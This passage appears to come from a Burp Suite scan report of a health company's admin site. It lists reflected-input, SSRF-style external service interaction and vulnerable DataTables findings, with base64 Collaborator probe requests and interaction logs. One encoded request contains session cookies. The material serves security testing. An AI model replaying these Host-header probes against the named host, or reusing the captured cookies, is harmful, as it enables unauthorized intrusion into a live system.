        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGxkMjBqbTQxemk2d3JnMHR3MHN0aHNodjhtZWcyZDExdTBpcTVndDUub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncHJnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>272297087144274944</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/dataTables.fixedColumns.js]]></path>
    <location><![CDATA[/js/datatables/dataTables.fixedColumns.js [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9kYXRhdGFibGVzLzFjZzNvOGVrc24gSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2511123880374155264</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/dataTables.fixedColumns.js]]></path>
    <location><![CDATA[/js/datatables/dataTables.fixedColumns.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>7qymw8hnc4ji42df9m5fueuhl8r2fz5nymmc92xr.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDdxeW13OGhuYzRqaTQyZGY5bTVmdWV1aGw4cjJmejVueW1tYzkyeHIub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.168.9</originIp>
      <time>2024-Dec-15 00:51:37.575 UTC</time>
      <lookupType>AAAA</lookupType>
      <lookupHost>7qymw8hnc4ji42df9m5fueuhl8r2fz5nymmc92xr.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>568601403727019008</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/dataTables.fixedColumns.js]]></path>
    <location><![CDATA[/js/datatables/dataTables.fixedColumns.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>7qymw8hnc4ji42df9m5fueuhl8r2fz5nymmc92xr.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDdxeW13OGhuYzRqaTQyZGY5bTVmdWV1aGw4cjJmejVueW1tYzkyeHIub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:51:38.496 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDdxeW13OGhuYzRqaTQyZGY5bTVmdWV1aGw4cjJmejVueW1tYzkyeHIub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncGlnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>2886924719282563072</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/dataTables.responsive.min.js]]></path>
    <location><![CDATA[/js/datatables/dataTables.responsive.min.js [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9kYXRhdGFibGVzL3dhc203ZTE0amogSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6953303064014992384</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/dataTables.responsive.min.js]]></path>
    <location><![CDATA[/js/datatables/dataTables.responsive.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>bq5qwchrc8jm46dj9q5juiullcr6f3hraqygl69v.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGJxNXF3Y2hyYzhqbTQ2ZGo5cTVqdWl1bGxjcjZmM2hyYXF5Z2w2OXYub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>137.184.209.149</originIp>
      <time>2024-Dec-15 00:55:25.061 UTC</time>
      <lookupType>AAAA</lookupType>
      <lookupHost>bq5qwchrc8jm46dj9q5juiullcr6f3hraqygl69v.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>7682764232431117312</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/dataTables.responsive.min.js]]></path>
    <location><![CDATA[/js/datatables/dataTables.responsive.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>bq5qwchrc8jm46dj9q5juiullcr6f3hraqygl69v.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGJxNXF3Y2hyYzhqbTQ2ZGo5cTVqdWl1bGxjcjZmM2hyYXF5Z2w2OXYub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>206.189.185.124</originIp>
      <time>2024-Dec-15 00:55:25.643 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGJxNXF3Y2hyYzhqbTQ2ZGo5cTVqdWl1bGxjcjZmM2hyYXF5Z2w2OXYub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncHVnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>8910978615813880832</serialNumber>
    <type>5243008</type>
    <name><![CDATA[Vulnerable JavaScript dependency]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/jquery.dataTables.min.js]]></path>
    <location><![CDATA[/js/datatables/jquery.dataTables.min.js]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>
The use of third-party JavaScript libraries can introduce a range of DOM-based vulnerabilities, including some that can be used to hijack user accounts like DOM-XSS. 
</p>

<p>
Common JavaScript libraries typically enjoy the benefit of being heavily audited. This may mean that bugs are quickly identified and patched upstream, resulting in a steady stream of security updates that need to be applied. Although it may be tempting to ignore updates, using a library with missing security patches can make your website exceptionally easy to exploit. Therefore, it's important to ensure that any available security updates are applied promptly. 
</p>
<p>
Some library vulnerabilities expose every application that imports the library, but others only affect applications that use certain library features. Accurately identifying which library vulnerabilities apply to your website can be difficult, so we recommend applying all available security updates regardless.
</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Develop a patch-management strategy to ensure that security updates are promptly applied to all third-party libraries in your application. Also, consider reducing your attack surface by removing any libraries that are no longer in use.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/1104.html">CWE-1104: Use of Unmaintained Third Party Components</a></li><li><a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9: Using Components with Known Vulnerabilities</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[<p>We observed a vulnerable JavaScript library.</p>
<p>We detected <strong>jquery.datatables</strong> version <strong>1.10.24</strong>, which has the following vulnerabilities:</p>
<ul>
<li>
possible XSS<br>
<a href="https://cdn.datatables.net/1.11.3/">https://cdn.datatables.net/1.11.3/</a><br>
<a href="https://github.com/DataTables/Dist-DataTables/commit/59a8d3f8a3c1138ab08704e783bc52bfe88d7c9b">https://github.com/DataTables/Dist-DataTables/commit/59a8d3f8a3c1138ab08704e783bc52bfe88d7c9b</a><br>
</li>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23445">CVE-2021-23445</a>: Cross site scripting in datatables.net<br>
</li>
</ul><br>
]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[jquery.datatables>.1.10.24]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9kYXRhdGFibGVzL2pxdWVyeS5kYXRhVGFibGVzLm1pbi5qcyBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpDb29raWU6IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0czsgQVdTQUxCPXlITERqbFY0V0o2NUZCTFMrMEJ2YkRpdUc1VGJQY1VOK0thNVhyMDBWMEhTTVVKSlhDSVRwczBCTSt4dHV4ZU43dFVHZVJ5VXZZN29hQUhsWmVjaTNjM0RSaHhjZi91ZHNZdW9jZ2tONFBLTmF2dWlXVlJkdXJaM3NvUGM7IEFXU0FMQkNPUlM9eUhMRGpsVjRXSjY1RkJMUyswQnZiRGl1RzVUYlBjVU4rS2E1WHIwMFYwSFNNVUpKWENJVHBzMEJNK3h0dXhlTjd0VUdlUnlVdlk3b2FBSGxaZWNpM2MzRFJoeGNmL3Vkc1l1b2Nna040UEtOYXZ1aVdWUmR1clozc29QYw0KU2VjLUNoLVVhLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpBY2NlcHQ6ICovKg0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtTW9kZTogbm8tY29ycw0KU2VjLUZldGNoLURlc3Q6IHNjcmlwdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9sb2dpbg0KQWNjZXB0LUVuY29kaW5nO